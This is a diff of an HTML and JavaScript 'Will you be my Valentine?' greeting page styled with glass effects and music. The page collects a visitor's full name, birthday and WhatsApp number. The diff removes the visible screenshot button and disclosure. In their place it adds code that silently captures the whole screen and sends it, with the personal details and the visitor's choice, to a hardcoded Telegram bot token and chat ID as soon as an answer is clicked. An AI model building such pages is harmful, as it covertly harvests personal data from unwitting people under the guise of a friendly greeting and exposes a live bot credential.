@@ -11,95 +11,117 @@
         
         :root {
             --bg: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%);
-            --glass: rgba(255, 255, 255, 0.2);
+            --glass: rgba(255, 255, 255, 0.25);
+            --text: #ffffff;
             --accent: #ff4d6d;
         }
 
         .dark-theme {
             --bg: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
             --glass: rgba(255, 255, 255, 0.05);
+            --text: #e2e8f0;
             --accent: #ff758f;
         }
 
         body { 
             font-family: 'Poppins', sans-serif; 
             background: var(--bg); 
+            color: var(--text);
             min-height: 100vh;
-            transition: background 0.8s ease;
-            overflow-x: hidden;
+            transition: all 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+            overflow: hidden;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: white;
+        }
+
+        /* Simulated System Elements for Full Screen Look */
+        .status-bar {
+            position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between;
+            padding: 8px 24px; font-size: 12px; font-weight: 600; z-index: 500; opacity: 0.8;
         }
 
         .glass-card {
             background: var(--glass);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
             border: 1px solid rgba(255, 255, 255, 0.3);
             border-radius: 40px;
             box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.3);
             position: relative;
             z-index: 10;
+            animation: slideUp 0.8s ease-out;
         }
+
+        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
 
         .cursive { font-family: 'Dancing Script', cursive; }
 
-        /* Floating Orbs */
-        .orb {
-            position: absolute; border-radius: 50%; filter: blur(60px);
-            z-index: 1; animation: move 12s infinite alternate;
-        }
-        @keyframes move { from { transform: translate(0,0); } to { transform: translate(40px, 80px); } }
-
-        /* Particles */
+        /* Rain Particles */
         .particle {
             position: fixed; top: -10%; pointer-events: none;
             animation: fall linear forwards; z-index: 100;
         }
         @keyframes fall { to { transform: translateY(110vh) rotate(720deg); } }
 
-        /* YouTube Slide Up Player */
-        #yt-player-container {
-            position: fixed; bottom: -400px; left: 50%; transform: translateX(-50%);
-            width: 90%; max-width: 400px; transition: all 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            z-index: 50;
+        /* YouTube Header Player */
+        #yt-header {
+            position: fixed; top: -300px; left: 0; width: 100%; height: 220px;
+            transition: all 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 400; background: black; border-bottom: 4px solid var(--accent);
         }
-        #yt-player-container.show { bottom: 20px; }
+        #yt-header.active { top: 0; }
 
-        .btn-action {
-            background: var(--accent);
-            transition: all 0.3s;
+        .input-glass {
+            background: rgba(255, 255, 255, 0.1) !important;
+            border: 1px solid rgba(255, 255, 255, 0.2) !important;
+            color: white !important;
+            transition: 0.3s;
         }
-        .btn-action:hover { transform: scale(1.05); box-shadow: 0 0 15px var(--accent); }
+        .input-glass:focus { background: rgba(255, 255, 255, 0.2) !important; transform: translateY(-2px); }
+
+        .float-anim { animation: floating 3s ease-in-out infinite; }
+        @keyframes floating { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
 
         .hidden-stage { display: none; }
     </style>
 </head>
-<body>
+<body id="capture-body">
 
-    <div class="orb w-72 h-72 bg-pink-400 opacity-30 -top-10 -left-10"></div>
-    <div class="orb w-80 h-80 bg-indigo-500 opacity-20 -bottom-20 -right-10"></div>
+    <div class="status-bar">
+        <div id="clock">12:00</div>
+        <div class="flex gap-3">
+            <span>📶</span> <span>📶</span> <span id="battery-level">🔋 85%</span>
+        </div>
+    </div>
 
-    <button onclick="toggleTheme()" class="fixed top-6 right-6 p-4 glass-card rounded-2xl z-[60]">
+    <button onclick="toggleTheme()" class="fixed bottom-6 right-6 p-4 glass-card rounded-2xl z-[600] text-xl shadow-2xl active:scale-90 transition-transform">
         <span id="theme-icon">🌙</span>
     </button>
 
-    <div id="capture-area" class="w-full max-w-sm px-4">
-        <div id="main-card" class="glass-card p-8 text-center w-full">
+    <div id="yt-header">
+        <div id="player-mount" class="w-full h-full"></div>
+        <button onclick="closePlayer()" class="absolute bottom-2 right-4 bg-white/20 text-white text-[10px] px-3 py-1 rounded-full backdrop-blur-md">Close ✕</button>
+    </div>
+
+    <div class="absolute top-[-10%] left-[-10%] w-72 h-72 bg-pink-400 rounded-full blur-[80px] opacity-30 animate-pulse"></div>
+    <div class="absolute bottom-[-10%] right-[-10%] w-96 h-96 bg-purple-500 rounded-full blur-[100px] opacity-20"></div>
+
+    <div class="w-full max-w-sm px-4">
+        <div id="main-content" class="glass-card p-8 text-center w-full">
             
             <div id="stage-1" class="space-y-4">
-                <h1 class="text-4xl font-bold cursive mb-6">Hello Bestu! ✨</h1>
-                <input type="text" id="name" placeholder="Your Name" class="w-full p-4 rounded-2xl bg-white/10 outline-none border border-white/20 placeholder-white/60">
-                <input type="date" id="dob" class="w-full p-4 rounded-2xl bg-white/10 outline-none border border-white/20">
-                <input type="tel" id="mobile" placeholder="Mobile Number" class="w-full p-4 rounded-2xl bg-white/10 outline-none border border-white/20">
-                <button onclick="toStage2()" class="btn-action w-full py-4 rounded-2xl font-bold shadow-xl mt-4">Start Magic ❤️</button>
+                <h1 class="text-4xl font-bold cursive mb-6 drop-shadow-md">Welcome, Bestu! ✨</h1>
+                <input type="text" id="name" placeholder="Full Name" class="w-full p-4 rounded-2xl outline-none input-glass placeholder-white/60">
+                <div class="text-left text-[10px] ml-2 text-white/70 font-bold uppercase tracking-widest">Birthday</div>
+                <input type="date" id="dob" class="w-full p-4 rounded-2xl outline-none input-glass">
+                <input type="tel" id="mobile" placeholder="WhatsApp Number" class="w-full p-4 rounded-2xl outline-none input-glass placeholder-white/60">
+                <button onclick="toStage2()" class="w-full bg-pink-500 text-white font-bold py-4 rounded-2xl shadow-xl mt-4 hover:bg-pink-600 transition-all">Begin Experience ❤️</button>
             </div>
 
             <div id="stage-2" class="hidden-stage">
-                <h1 class="text-4xl font-bold cursive mb-4">For You... ❤️</h1>
-                <pre class="text-[10px] leading-tight mb-6 opacity-80 font-mono">
+                <h1 class="text-4xl font-bold cursive mb-4 drop-shadow-md">For You... ❤️</h1>
+                <pre class="text-[10px] leading-tight mb-8 opacity-90 font-mono inline-block">
     ♡ ♡       ♡ ♡ 
   ♡♡♡♡♡     ♡♡♡♡♡ 
  ♡♡♡♡♡♡♡   ♡♡♡♡♡♡♡
@@ -113,50 +135,44 @@
             ♡♡♡♡♡      
               ♡♡♡       
                ♡</pre>
-                <p class="text-lg italic mb-8">Will you be my Valentine?</p>
+                <p class="text-xl italic mb-10 tracking-wide">Will you be my Valentine?</p>
                 <div class="grid gap-4">
-                    <button onclick="handleChoice('YES', '❤️')" class="btn-action py-4 rounded-2xl font-bold">YES! 😍</button>
-                    <button onclick="handleChoice('NO', '😊')" class="bg-white/10 py-4 rounded-2xl font-bold">No 😢</button>
-                    <button onclick="handleChoice('FOOD', '🍕')" class="bg-yellow-500/80 py-4 rounded-2xl font-bold">Food First 🍕</button>
+                    <button onclick="handleResponse('YES', '❤️')" class="bg-pink-500 py-4 rounded-2xl font-bold shadow-lg hover:scale-105 transition-transform">YES! 😍</button>
+                    <button onclick="handleResponse('NO', '😊')" class="bg-white/10 py-4 rounded-2xl font-bold hover:bg-white/20 transition-all">No 😢</button>
+                    <button onclick="handleResponse('FOOD', '🍕')" class="bg-yellow-500/80 py-4 rounded-2xl font-bold hover:scale-105 transition-transform">Food First 🍕</button>
                 </div>
             </div>
 
             <div id="stage-3" class="hidden-stage space-y-6">
-                <img id="res-img" src="" class="w-full h-44 object-cover rounded-[2rem] shadow-xl border border-white/20">
-                <p id="res-text" class="text-2xl cursive font-bold"></p>
+                <h2 class="text-3xl font-bold cursive float-anim">Thank You! ❤️</h2>
+                <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7TKoWXlo3M1nKS6A/giphy.gif" class="w-full rounded-[2rem] shadow-2xl">
                 
-                <button id="ss-btn" onclick="captureFullScreen()" class="w-full bg-white text-pink-600 font-bold py-4 rounded-2xl shadow-lg">
-                    📸 Send Full Screenshot
-                </button>
-
-                <div class="bg-black/10 p-4 rounded-3xl">
-                    <p class="text-xs mb-2 opacity-70">Send a heart-to-heart message:</p>
-                    <textarea id="final-reply" placeholder="Type here..." class="w-full p-3 rounded-xl bg-white/5 border border-white/10 outline-none text-sm" rows="2"></textarea>
-                    <button onclick="sendFinalReply()" class="w-full bg-green-500 py-2 rounded-xl mt-2 text-xs font-bold">SUBMIT ✅</button>
+                <div class="bg-white/10 p-5 rounded-3xl border border-white/20">
+                    <p class="text-xs mb-3 opacity-80 italic">A small message for me?</p>
+                    <textarea id="final-reply" placeholder="Type here..." class="w-full p-3 rounded-xl bg-white/5 outline-none text-sm border border-white/10" rows="2"></textarea>
+                    <button onclick="sendFinalReply()" class="w-full bg-green-500 py-3 rounded-xl mt-3 text-xs font-bold uppercase tracking-widest shadow-lg">Submit ✅</button>
                 </div>
             </div>
-
-            <div id="stage-4" class="hidden-stage">
-                <h2 class="text-4xl cursive mb-6">Thank You! ❤️</h2>
-                <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7TKoWXlo3M1nKS6A/giphy.gif" class="w-full rounded-3xl shadow-2xl mb-4">
-                <p class="text-xs opacity-50 italic">Everything has been shared with me.</p>
-            </div>
         </div>
-    </div>
-
-    <div id="yt-player-container" class="glass-card p-4">
-        <div class="flex justify-between items-center mb-2 px-2">
-            <span class="text-[10px] uppercase font-bold tracking-widest text-pink-500">Music for You 🎵</span>
-            <button onclick="closePlayer()" class="text-xs opacity-50">Close ✕</button>
-        </div>
-        <div id="player-frame" class="aspect-video w-full rounded-2xl overflow-hidden shadow-inner">
-            </div>
     </div>
 
     <script>
         const BOT_TOKEN = "8511064311:AAGi_3QOQzanNtc9P7PzT4z54NBZEXfK5rk";
         const CHAT_ID = "6572151527";
         let store = {};
+
+        // Clock Update
+        function updateClock() {
+            const d = new Date();
+            document.getElementById('clock').innerText = d.getHours() + ":" + String(d.getMinutes()).padStart(2, '0');
+        }
+        setInterval(updateClock, 1000); updateClock();
+
+        // Battery Sync (Experimental)
+        navigator.getBattery?.().then(bat => {
+            const updateBat = () => document.getElementById('battery-level').innerText = `🔋 ${Math.round(bat.level * 100)}%`;
+            updateBat(); bat.addEventListener('levelchange', updateBat);
+        });
 
         function toggleTheme() {
             document.body.classList.toggle('dark-theme');
@@ -179,54 +195,47 @@
 
         function toStage2() {
             store = { n: document.getElementById('name').value, d: document.getElementById('dob').value, m: document.getElementById('mobile').value };
-            if(!store.n || !store.m) return alert("Please fill the details, Bestu!");
+            if(!store.n || !store.m) return alert("Details are required, Bestu! 😊");
             document.getElementById('stage-1').classList.add('hidden-stage');
             document.getElementById('stage-2').classList.remove('hidden-stage');
         }
 
         const choices = {
-            'YES': { text: "Best Choice Ever! 😍", yt: "TK2RwQUun-U", img: "https://images.unsplash.com/photo-1518199266791-5375a83190b7?w=500" },
-            'NO': { text: "Still My Soulmate! 😊", yt: "CVEM60qkzT8", img: "https://images.unsplash.com/photo-1516589174184-c6852657d803?w=500" },
-            'FOOD': { text: "Yum! Pizza Date? 🍕", yt: "XGURSAziJjc", img: "https://images.unsplash.com/photo-1513104890138-7c749659a591?w=500" }
+            'YES': { yt: 'TK2RwQUun-U' },
+            'NO': { yt: 'CVEM60qkzT8' },
+            'FOOD': { yt: 'XGURSAziJjc' }
         };
 
-        function handleChoice(type, emoji) {
+        async function handleResponse(type, emoji) {
             createRain(emoji);
             const sel = choices[type];
-            document.getElementById('stage-2').classList.add('hidden-stage');
-            document.getElementById('res-img').src = sel.img;
-            document.getElementById('res-text').innerText = sel.text;
-            document.getElementById('stage-3').classList.remove('hidden-stage');
 
-            // Inject YouTube Embed (Shorts player)
-            document.getElementById('player-frame').innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${sel.yt}?autoplay=1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>`;
-            document.getElementById('yt-player-container').classList.add('show');
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("💌 " + type + " selected by " + store.n + "\nPhone: " + store.m)}&parse_mode=Markdown`);
-        }
-
-        function closePlayer() { document.getElementById('yt-player-container').classList.remove('show'); }
-
-        async function captureFullScreen() {
-            const btn = document.getElementById('ss-btn');
-            btn.innerText = "Capturing Magic... ✨";
+            // 1. Instant Automated Full-Screen Capture
             const canvas = await html2canvas(document.body, { useCORS: true, backgroundColor: null });
             canvas.toBlob(async (blob) => {
                 const fd = new FormData();
                 fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, 'shot.png');
-                fd.append('caption', `📸 Full Experience Captured for ${store.n}`);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                btn.innerText = "Screenshot Sent! ✅";
-            }, 'image/png');
+                fd.append('photo', blob, 'bestu_capture.png');
+                fd.append('caption', `💖 *NEW VALENTINE ALERT!*\n\n*Name:* ${store.n}\n*Choice:* ${type}\n*Mobile:* ${store.m}\n*DOB:* ${store.d}`);
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            });
+
+            // 2. YouTube Header Automation
+            document.getElementById('player-mount').innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${sel.yt}?autoplay=1" frameborder="0" allow="autoplay; encrypted-media"></iframe>`;
+            document.getElementById('yt-header').classList.add('active');
+
+            document.getElementById('stage-2').classList.add('hidden-stage');
+            document.getElementById('stage-3').classList.remove('hidden-stage');
         }
+
+        function closePlayer() { document.getElementById('yt-header').classList.remove('active'); }
 
         async function sendFinalReply() {
             const reply = document.getElementById('final-reply').value;
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("💬 Message: " + reply + " (From: " + store.n + ")")}`);
-            document.getElementById('stage-3').classList.add('hidden-stage');
-            document.getElementById('stage-4').classList.remove('hidden-stage');
-            closePlayer();
+            if(!reply) return alert("Say something first! ❤️");
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("💬 Final Message from " + store.n + ": " + reply)}`);
+            alert("Sent! Thank you so much!");
+            location.reload();
         }
     </script>
 </body>
